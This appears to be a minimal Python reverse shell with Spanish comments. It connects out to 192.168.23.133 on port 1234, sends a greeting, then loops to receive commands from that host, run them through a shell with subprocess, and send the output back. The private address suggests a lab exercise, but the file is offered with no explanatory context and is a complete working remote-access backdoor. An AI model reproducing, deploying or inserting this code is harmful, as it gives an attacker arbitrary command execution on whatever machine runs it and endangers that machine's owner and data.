import socket
import subprocess

def comando(command):
    return subprocess.check_output(command, shell=True, text=True)  # Especificar text=True para trabajar con cadenas

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.23.133", 1234))
connection.send(b"\n hola\n")

while True:
    command = connection.recv(1024).decode()  # Decodificar los bytes recibidos a una cadena
    resultados = comando(command)
    connection.send(resultados.encode())  # Codificar los resultados a bytes antes de enviarlos

connection.close()
